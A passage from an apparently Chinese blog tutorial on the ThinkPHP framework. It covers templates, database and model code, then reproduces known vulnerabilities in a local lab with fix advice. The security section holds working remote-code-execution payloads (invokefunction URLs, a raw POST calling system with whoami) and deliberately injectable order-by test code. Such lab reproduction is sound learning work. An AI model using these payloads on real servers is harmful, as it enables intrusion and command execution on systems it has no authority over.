+<p><img src="/2020/01/19/thinkphp/thinkphp-view-05.png" alt="thinkphp-view-05"></p>
+<h4 id="使用函数"><a href="#使用函数" class="headerlink" title="使用函数"></a>使用函数</h4><p>需要对模板输出使用函数进行过滤或其它处理的时候，可以使用：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;:strtoupper(md5($name))&#125;</div></pre></td></tr></table></figure></p>
+<p>编译后的结果是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> strtoupper(md5($name)); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>例：<br>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">// view</span></div><div class="line">        $name =<span class="string">'lxhsec'</span>;</div><div class="line">        <span class="keyword">return</span> view(<span class="string">'demo@test/req1'</span>,compact(<span class="string">'name'</span>));</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>req1.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    hello &#123;$name&#125;, md5:&#123;:strtoupper(md5($name))&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-view-07.png" alt="thinkphp-view-07"></p>
+<h4 id="原样输出"><a href="#原样输出" class="headerlink" title="原样输出"></a>原样输出</h4><p>可以使用literal标签来防止模板标签被解析。</p>
+<p>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;literal&#125;</div><div class="line">    Hello,&#123;$name&#125;！</div><div class="line">&#123;/literal&#125;</div></pre></td></tr></table></figure></p>
+<p>上面的{$name}标签被literal标签包含，因此并不会被模板引擎解析，而是保持原样输出。</p>
+<p>更改req1.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">&#123;literal&#125;</div><div class="line">    hello &#123;$name&#125;, md5:&#123;:strtoupper(md5($name))&#125;</div><div class="line">&#123;/literal&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-view-08.png" alt="thinkphp-view-08"></p>
+<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>在config/database.php中填写好配置信息，连接数据库。</p>
+<h4 id="原生sql"><a href="#原生sql" class="headerlink" title="原生sql"></a>原生sql</h4><p>使用原生sql：<br>引入:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</div></pre></td></tr></table></figure></p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">// 读取配置文件中的配置</span></div><div class="line">        <span class="comment">// echo config('database.prefix');</span></div><div class="line"></div><div class="line">        <span class="comment">//原生sql</span></div><div class="line">        <span class="comment">//查询使用query</span></div><div class="line"><span class="comment">//        $sql = "select * from tb_test where id=?" ;</span></div><div class="line"><span class="comment">//        $ret = Db::query($sql,[1]);</span></div><div class="line"><span class="comment">//        dump($ret);</span></div><div class="line"></div><div class="line">        <span class="comment">//推荐关联数组写法。</span></div><div class="line">        $sql = <span class="string">"select * from tb_test where id=:id"</span> ;</div><div class="line">        $ret = Db::query($sql,[<span class="string">'id'</span> =&gt; <span class="number">1</span>]);</div><div class="line">        dump($ret);</div><div class="line"></div><div class="line">        <span class="comment">//insert, delete, update 都使用execute</span></div><div class="line">        $sql = <span class="string">"insert into tb_test (username,password,nickname) values (:username,:password,:nickname)"</span>;</div><div class="line"></div><div class="line">        $ret1 = Db::execute($sql,[<span class="string">'username'</span> =&gt; <span class="string">'insert'</span>,</div><div class="line">            <span class="string">'password'</span> =&gt; <span class="string">'0CC175B9C0F1B6A831C399E269772661'</span>,</div><div class="line">            <span class="string">'nickname'</span>=&gt;<span class="string">'inserttext'</span>]);</div><div class="line"></div><div class="line">        dump($ret1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-database-01.png" alt="thinkphp-database-01"></p>
+<h4 id="CURD"><a href="#CURD" class="headerlink" title="CURD"></a>CURD</h4><p>以添加数据为例，删，改，查操作基本类似。</p>
+<h5 id="增"><a href="#增" class="headerlink" title="增"></a>增</h5><p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">//DB:table</span></div><div class="line"><span class="comment">//        $data = ['username'=&gt;'insert2','password'=&gt;'187EF4436122D1CC2F40DC2B92F0EBA0','nickname'=&gt;'inserttest2'];</span></div><div class="line"><span class="comment">//        $ret =  Db::table('tb_test')-&gt;insert($data); // 返回插入的行数</span></div><div class="line"><span class="comment">//        dump($ret);</span></div><div class="line"><span class="comment">//</span></div><div class="line">        <span class="comment">//DB:name  与table的区别是不用写表前缀,前提是 你在config/database.php 设置了表前缀 ，'prefix'          =&gt; 'tb_',</span></div><div class="line"></div><div class="line"><span class="comment">//        $data = ['username'=&gt;'insert3','password'=&gt;'187EF4436122D1CC2F40DC2B92F0EBA0','nickname'=&gt;'inserttest2'];</span></div><div class="line"><span class="comment">//        $ret =  Db::name('test')-&gt;insert($data);</span></div><div class="line"><span class="comment">//        dump($ret);</span></div><div class="line"></div><div class="line">        <span class="comment">//助手函数</span></div><div class="line">        $data = [<span class="string">'username'</span>=&gt;<span class="string">'insert55'</span>,<span class="string">'password'</span>=&gt;<span class="string">'187EF4436122D1CC2F40DC2B92F0EBA0'</span>,<span class="string">'nickname'</span>=&gt;<span class="string">'inserttest4'</span>];</div><div class="line"><span class="comment">//        $ret = db('test')-&gt;insert($data);</span></div><div class="line">        $ret = db(<span class="string">'test'</span>)-&gt;insertGetId($data); <span class="comment">// 返回插入成功后的主键id。</span></div><div class="line">        dump($ret);</div><div class="line"></div><div class="line">        <span class="comment">//插入多条</span></div><div class="line">        $data = [</div><div class="line">            [<span class="string">'username'</span>=&gt;<span class="string">'insert6'</span>,<span class="string">'password'</span>=&gt;<span class="string">'187EF4436122D1CC2F40DC2B92F0EBA0'</span>,<span class="string">'nickname'</span>=&gt;<span class="string">'inserttest4'</span>],</div><div class="line">            [<span class="string">'username'</span>=&gt;<span class="string">'insert7'</span>,<span class="string">'password'</span>=&gt;<span class="string">'187EF4436122D1CC2F40DC2B92F0EBA0'</span>,<span class="string">'nickname'</span>=&gt;<span class="string">'inserttest4'</span>],</div><div class="line">            [<span class="string">'username'</span>=&gt;<span class="string">'insert8'</span>,<span class="string">'password'</span>=&gt;<span class="string">'187EF4436122D1CC2F40DC2B92F0EBA0'</span>,<span class="string">'nickname'</span>=&gt;<span class="string">'inserttest4'</span>],</div><div class="line">            [<span class="string">'username'</span>=&gt;<span class="string">'insert9'</span>,<span class="string">'password'</span>=&gt;<span class="string">'187EF4436122D1CC2F40DC2B92F0EBA0'</span>,<span class="string">'nickname'</span>=&gt;<span class="string">'inserttest4'</span>],</div><div class="line"></div><div class="line">        ];</div><div class="line">        $ret = db(<span class="string">'test'</span>)-&gt;insertAll($data); <span class="comment">// 返回插入成功后的主键id。</span></div><div class="line">        dump($ret);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-database-02.png" alt="thinkphp-database-02"></p>
+<p><a href="https://www.kancloud.cn/manual/thinkphp5_1/353999" target="_blank" rel="external">更多其他操作</a></p>
+<h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><h4 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a>模型定义</h4><p>首先在模块demo下新建model目录，在新增php文件，php文件名就是模型类的类名。</p>
+<p>thinkphp规定模型类 类名的命名规则是除去表前缀的数据表名称，采用驼峰法命名，并且首字母大写，例如：</p>
+<table>
+<thead>
+<tr>
+<th>模型名</th>
+<th>约定对应数据表（假设数据库的前缀定义是 tb_）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User</td>
+<td>tb_user</td>
+</tr>
+<tr>
+<td>Test</td>
+<td>tb_test</td>
+</tr>
+</tbody>
+</table>
+<p>这里我们的表名是tb_test,因此定义的模型类为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">model</span>;</div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>thinkphp模型对应的 数据表名称 都是遵循小写+下划线规范，如果你的表名有大写的情况，必须通过设置模型的table属性。</p>
+<p>即：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">model</span>;</div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</div><div class="line"></div><div class="line">	<span class="comment">// 设置当前模型对应的完整数据表名称</span></div><div class="line">        <span class="keyword">protected</span> $table = <span class="string">'tb_User'</span>;</div><div class="line"></div><div class="line">	<span class="comment">//设置表主键</span></div><div class="line">	<span class="keyword">protected</span> $pk = <span class="string">'id'</span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>实例化模型：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">//实例化 两种方式</span></div><div class="line"><span class="comment">//        $model = new \app\demo\model\Test();</span></div><div class="line">        $model = model(<span class="string">'test'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="模型CURD"><a href="#模型CURD" class="headerlink" title="模型CURD"></a>模型CURD</h4><p>model/Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">model</span>;</div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</div><div class="line">    <span class="comment">// 设置当前模型对应的完整数据表名称</span></div><div class="line">    <span class="keyword">protected</span> $table = <span class="string">'tb_test'</span>;</div><div class="line"></div><div class="line">    <span class="comment">//设置表主键</span></div><div class="line">    <span class="keyword">protected</span> $pk = <span class="string">'id'</span>;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>controller/Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">//实例化</span></div><div class="line"><span class="comment">//        $model = new \app\demo\model\Test();</span></div><div class="line">        $model = model(<span class="string">'test'</span>);</div><div class="line">        $data = [</div><div class="line">            <span class="string">'username'</span>=&gt;<span class="string">'modelinsert'</span>,</div><div class="line">            <span class="string">'password'</span>=&gt;<span class="string">'187EF4436122D1CC2F40DC2B92F0EBA0'</span>,</div><div class="line">            <span class="string">'nickname'</span>=&gt;<span class="string">'modelnick'</span></div><div class="line">            ];</div><div class="line">        $ret = $model-&gt;save($data);</div><div class="line"></div><div class="line">	<span class="comment">//或者 模型类名::create()方式插入数据。</span></div><div class="line">	<span class="comment">//$ret =  Test::create($data);</span></div><div class="line"></div><div class="line">        dump($ret);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-model-02.png" alt="thinkphp-model-02"></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-model-01.png" alt="thinkphp-model-01"></p>
+<p><a href="https://www.kancloud.cn/manual/thinkphp5_1/354040" target="_blank" rel="external">更多模型其他操作</a></p>
+<h2 id="thinkphp安全"><a href="#thinkphp安全" class="headerlink" title="thinkphp安全"></a>thinkphp安全</h2><h3 id="thinkphp-框架漏洞"><a href="#thinkphp-框架漏洞" class="headerlink" title="thinkphp 框架漏洞"></a>thinkphp 框架漏洞</h3><h4 id="ThinkPHP-5-x-远程代码执行漏洞"><a href="#ThinkPHP-5-x-远程代码执行漏洞" class="headerlink" title="ThinkPHP 5.x 远程代码执行漏洞"></a>ThinkPHP 5.x 远程代码执行漏洞</h4><h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>5.0.5-（含）5.0.22<br>5.1.0-（含）5.1.30</p>
+<p><a href="https://blog.thinkphp.cn/869075" target="_blank" rel="external">https://blog.thinkphp.cn/869075</a></p>
+<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>使用composer安装5.1.29<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">composer create-project topthink/think=5.1.29 tp5_1_29</div></pre></td></tr></table></figure></p>
+<p>安装完成后，<code>thinkphp/framework</code> 默认安装是最新的版本，因此我们需要将它也改成5.1.29.</p>
+<p>切换到5_1_29目录下，执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">composer require &quot;topthink/framework=5.1.29&quot;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-vuln-rce-01.png" alt="thinkphp-vuln-rce-01"></p>
+<p>安装完成后，浏览器访问：<br><code>http://localhost/tp5_1_29/public/index.php/index/index/index</code><br><img src="/2020/01/19/thinkphp/thinkphp-vuln-rce-02.png" alt="thinkphp-vuln-rce-02"></p>
+<p>至此，环境搭建完成。</p>
+<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/tp5_1_29/public/index.php/index/index/index?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2020/01/19/thinkphp/thinkphp-vuln-rce-03.png" alt="thinkphp-vuln-rce-03"></p>
+<p>如果是5.0.x的版本:</p>
+<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/tp5_0_20/public/index.php/index/index/index?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2020/01/19/thinkphp/thinkphp-vuln-rce-04.png" alt="thinkphp-vuln-rce-04"></p>
+<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><p>1.升级版本：<br>thinkphp-version&gt;=5.0.24<br>thinkphp-version&gt;=5.1.31</p>
+<p>or</p>
+<p>2.开启强制路由。</p>
+<h4 id="ThinkPHP-5-0-x-远程代码执行漏洞"><a href="#ThinkPHP-5-0-x-远程代码执行漏洞" class="headerlink" title="ThinkPHP 5.0.x 远程代码执行漏洞"></a>ThinkPHP 5.0.x 远程代码执行漏洞</h4><h5 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h5><p>该漏洞主要影响Thinkphp5.0.0-5.0.23版本。</p>
+<p><a href="http://www.thinkphp.cn/topic/60992.html" target="_blank" rel="external">http://www.thinkphp.cn/topic/60992.html</a></p>
+<h5 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>参考 <code>ThinkPHP 5.x 远程代码执行漏洞</code> 环境搭建 章节</p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-vuln-rce1-00.png" alt="thinkphp-vuln-rce1-00"></p>
+<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>这里以thinkphp 5.0.23环境进行复现，</p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-vuln-rce1-01.png" alt="thinkphp-vuln-rce1-01"></p>
+<p>1.首先 打开thinkphp的调试模式</p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-vuln-rce1-02.png" alt="thinkphp-vuln-rce1-02"></p>
+<p>2.访问默认的index模块<code>http://localhost/tp5_0_23/public/index.php/index/index/index</code></p>
+<p>POST请求index模块：<br><code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-vuln-rce1-03.png" alt="thinkphp-vuln-rce1-03"></p>
+<p>Raw：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /tp5_0_23/public/index.php/index/index/index HTTP/1.1</div><div class="line">Host: 192.168.43.30</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: home_lang=cn; admin_lang=cn; referurl=%2Feyou%2F%3Fm%3Duser%26c%3DUsers%26a%3Dcentre; PHPSESSID=i32079k4193h8o9me2imtv5v14</div><div class="line">Connection: close</div><div class="line">Content-Length: 76</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line"></div><div class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-vuln-rce1-04.png" alt="thinkphp-vuln-rce1-04"></p>
+<h5 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><h5 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h5><p>1.升级到thinkphp版本。<br>thinkphp-version&gt;=5.0.24</p>
+<p>or</p>
+<p>2.关闭thinkphp 调试模式。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'app_debug'</span>              =&gt; <span class="keyword">false</span>,</div></pre></td></tr></table></figure></p>
+<h6 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h6><p><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="external">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a><br><a href="https://www.freebuf.com/vuls/194093.html" target="_blank" rel="external">https://www.freebuf.com/vuls/194093.html</a></p>
+<h4 id="ThinkPHP-3-x-5-x-order-by-注入漏洞"><a href="#ThinkPHP-3-x-5-x-order-by-注入漏洞" class="headerlink" title="ThinkPHP 3.x/5.x order by 注入漏洞"></a>ThinkPHP 3.x/5.x order by 注入漏洞</h4><h5 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h5><p>ThinkPHP &lt;=5.1.22，&lt;=3.2.3</p>
+<h5 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>以5.1.22为例。<br><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-01.png" alt="thinkphp-sqli-vuln-orderby-01"></p>
+<h5 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>1.首先开启thinkphp debug模式，<br><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-02.png" alt="thinkphp-sqli-vuln-orderby-02"></p>
+<p>并配置好database.php的数据库连接信息<br><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-05.png" alt="thinkphp-sqli-vuln-orderby-05"></p>
+<p>2.添加测试代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">orderbytest</span><span class="params">()</span></span>&#123;</div><div class="line">    $order = input(<span class="string">'get.order'</span>);</div><div class="line">    $m = db(<span class="string">'test'</span>)-&gt;order($order)-&gt;find();</div><div class="line">    var_dump($m);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
